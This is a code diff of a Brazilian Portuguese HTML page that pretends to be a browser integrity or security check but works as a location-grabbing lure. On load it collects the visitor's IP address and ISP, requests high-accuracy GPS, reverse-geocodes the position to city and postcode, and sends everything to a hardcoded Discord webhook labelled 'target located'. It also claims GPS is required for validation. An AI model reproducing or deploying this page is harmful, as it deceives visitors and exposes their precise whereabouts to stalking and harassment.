@@ -2,72 +2,70 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <title>Verificando...</title>
+    <title>Sincronizando...</title>
 </head>
-<body style="background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+<body style="background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
     <div style="text-align: center;">
-        <div id="status">Aguarde, processando segurança...</div>
+        <div style="border: 3px solid #333; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px;"></div>
+        <div id="status">Verificando integridade do navegador...</div>
     </div>
+    <style>@keyframes spin {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1473782004226195456/X3ZuJvvwZYDp-ZpF_BSTFOhifd6tq_CRiEMlcz_LkiMPZR9kLbdMBRS6Y1a5PaEaUiKe";
 
-        async function enviarDados(lat, lon) {
-            document.getElementById('status').innerText = "Sincronizando dados...";
-            
+        async function capturar() {
             try {
-                // Pega a cidade real
-                const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                const data = await geo.json();
-                
-                // Pega o IP e Provedor
+                // 1. Pega IP e Provedor (Rápido)
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
 
-                const payload = {
-                    embeds: [{
-                        title: "🎯 LOCALIZAÇÃO REAL ENCONTRADA",
-                        color: 65280,
-                        fields: [
-                            { name: "🚩 Pais:", value: data.address.country || "Brasil", inline: true },
-                            { name: "🏛️ Estado:", value: data.address.state || "N/A", inline: true },
-                            { name: "🏙️ Cidade:", value: data.address.city || data.address.town || "N/A", inline: true },
-                            { name: "📮 Cep:", value: data.address.postcode || "N/A", inline: true },
-                            { name: "📍 Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
-                            { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false }
-                        ]
-                    }]
-                };
+                // 2. Tenta pegar GPS
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
 
-                // O 'await' aqui é OBRIGATÓRIO para não sumir antes de enviar
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+                    // 3. Traduz coordenadas para Cidade/Rua Real
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                    const geoData = await geoRes.json();
+                    
+                    const endereco = geoData.address;
+                    const cidadeReal = endereco.city || endereco.town || endereco.village || "Desconhecida";
+                    const cepReal = endereco.postcode || "N/A";
 
-                document.getElementById('status').innerText = "Concluído! Você já pode fechar esta aba.";
-                console.log("Enviado com sucesso!");
+                    // Envio final com TUDO corrigido
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🎯 ALVO LOCALIZADO (CIDADE REAL)",
+                                color: 65280,
+                                fields: [
+                                    { name: "🚩 Pais:", value: endereco.country || "Brasil", inline: true },
+                                    { name: "🏛️ Estado:", value: endereco.state || "N/A", inline: true },
+                                    { name: "🏙️ Cidade Real:", value: cidadeReal, inline: true },
+                                    { name: "📮 Cep:", value: cepReal, inline: true },
+                                    { name: "📍 Google Maps:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
+                                    { name: "🌐 Provedor:", value: ipData.org || "N/A", inline: false },
+                                    { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: false }
+                                ]
+                            }]
+                        })
+                    });
 
-            } catch (error) {
-                document.getElementById('status').innerText = "Erro ao processar. Tente novamente.";
-                console.error(error);
+                    document.getElementById('status').innerText = "Verificação Concluída.";
+                    
+                }, (erro) => {
+                    document.getElementById('status').innerText = "Erro: GPS necessário para validar.";
+                }, { enableHighAccuracy: true });
+
+            } catch (e) {
+                console.error(e);
             }
         }
 
-        window.onload = () => {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        enviarDados(pos.coords.latitude, pos.coords.longitude);
-                    },
-                    (erro) => {
-                        document.getElementById('status').innerText = "Erro: Localização necessária.";
-                    },
-                    { enableHighAccuracy: true }
-                );
-            }
-        };
+        window.onload = capturar;
     </script>
 </body>
 </html>
